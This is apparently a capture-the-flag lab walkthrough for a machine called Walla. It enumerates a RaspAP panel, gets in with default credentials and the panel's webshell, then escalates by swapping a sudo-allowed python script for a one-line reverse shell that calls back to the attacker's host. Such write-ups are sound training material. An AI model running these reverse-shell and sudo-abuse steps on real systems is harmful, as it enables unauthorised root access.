# Walla

### Enumeration

```
8091/tcp  open  http       lighttpd 1.4.53
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=RaspAP
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-favicon: Unknown favicon MD5: B5F9F8F2263315029AD7A81420E6CC2D
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: lighttpd/1.4.53
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
```

RaspAP - default credentials!

Console Webshell!

```
http://192.168.112.97:8091/index.php?page=system_info
```

### Initial Access

https://www.revshells.com/ - Python #1 192.168.49.112 80 /bin/bash

Execute it in `/index.php?page=system_info`

### PrivEsc

```
www-data@walla:/home/walter$ sudo -l
User www-data may run the following commands on walla:
    (ALL) NOPASSWD: /sbin/ifup
    (ALL) NOPASSWD: /usr/bin/python /home/walter/wifi_reset.py
    (ALL) NOPASSWD: /bin/systemctl start hostapd.service
    (ALL) NOPASSWD: /bin/systemctl stop hostapd.service
    (ALL) NOPASSWD: /bin/systemctl start dnsmasq.service
    (ALL) NOPASSWD: /bin/systemctl stop dnsmasq.service
    (ALL) NOPASSWD: /bin/systemctl restart dnsmasq.service

You have write privileges over /lib/systemd/system/raspapd.service
```

We can delete the file `/home/walter/wifi_reset.py` and create a python reverse shell with same name.

```
www-data@walla:/$ rm /home/walter/wifi_reset.py
www-data@walla:/$ echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.112",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")' > /home/walter/wifi_reset.py
www-data@walla:/$ sudo /usr/bin/python /home/walter/wifi_reset.py
```
